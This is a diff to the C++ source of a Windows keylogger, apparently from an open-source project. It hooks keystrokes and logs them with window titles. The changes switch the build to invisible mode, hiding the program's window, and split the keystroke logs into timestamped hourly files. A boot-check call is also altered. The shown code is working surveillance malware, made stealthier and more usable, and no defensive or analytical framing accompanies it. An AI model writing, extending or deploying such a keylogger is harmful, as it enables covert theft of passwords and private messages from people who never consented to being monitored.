@@ -10,7 +10,7 @@
 
 // defines whether the window is visible or not
 // should be solved with makefile, not in this file
-#define visible // (visible / invisible)
+#define invisible // (visible / invisible)
 // Defines whether you want to enable or disable 
 // boot time waiting if running at system boot.
 #define bootwait // (bootwait / nowait)
@@ -63,6 +63,9 @@ KBDLLHOOKSTRUCT kbdStruct;
 
 int Save(int key_stroke);
 std::ofstream output_file;
+
+char output_filename[32];
+int cur_hour = -1;
 
 // This is the callback function. Consider it the event that is raised when, in this case,
 // a key is pressed.
@@ -118,6 +121,11 @@ int Save(int key_stroke)
 	HWND foreground = GetForegroundWindow();
 	DWORD threadID;
 	HKL layout = NULL;
+	
+	// get time
+	struct tm tm_info;
+	const time_t t = time(NULL);
+	localtime_s(&tm_info, &t);
 
 	if (foreground)
 	{
@@ -134,13 +142,8 @@ int Save(int key_stroke)
 		if (strcmp(window_title, lastwindow) != 0)
 		{
 		    strcpy_s(lastwindow, sizeof(lastwindow), window_title);
-		    // get time
-		    struct tm tm_info;
-		    time_t t = time(NULL);
-		    localtime_s(&tm_info, &t);
-		    char s[64];
-		    strftime(s, sizeof(s), "%FT%X%z", &tm_info);
-
+			char s[64];
+		    strftime(s, sizeof(s), "%Y-%m-%dT%X", &tm_info);
 			output << "\n\n[Window: " << window_title << " - at " << s << "] ";
 		}
 	}
@@ -178,6 +181,16 @@ int Save(int key_stroke)
 		output << char(key);
 	}
 #endif
+	// Determine current hour and base log file on that
+	// To avoid massive single logfile
+	if (cur_hour != tm_info.tm_hour) {
+		cur_hour = tm_info.tm_hour;
+		output_file.close();
+		strftime(output_filename, sizeof(output_filename), "logs/%Y-%m-%d__%H-%M-%S.log", &tm_info);
+		output_file.open(output_filename, std::ios_base::app);
+		std::cout << "Logging output to " << output_filename << std::endl;
+	}
+
 	// instead of opening and closing file handlers every time, keep file open and flush.
 	output_file << output.str();
 	output_file.flush();
@@ -201,7 +214,8 @@ void Stealth()
 // Function to check if the system is still booting up
 bool IsSystemBooting() 
 {
-	return GetSystemMetrics(SM_SYSTEMDOCKED) != 0;
+//	return GetSystemMetrics(SM_SYSTEMDOCKED) != 0;
+	return GetSystemMetrics(0x2004) != 0;
 }
 
 int main()
@@ -220,16 +234,11 @@ int main()
 	#ifdef nowait // If defined at the top of this file, do not wait for boot metrics.
 		std::cout << "Skipping boot metrics check.\n";
 	#endif
+
 	// This part of the program is reached once the system has 
 	// finished booting up aka when the while loop is broken 
 	// with the correct returned value.
 	
-	// Open the output file in append mode.
-	// Feel free to rename this output file. 
-	const char* output_filename = "keylogger.log";
-	std::cout << "Logging output to " << output_filename << std::endl;
-	output_file.open(output_filename, std::ios_base::app);
-
 	// Call the hook function and set the hook.
 	SetHook();
 
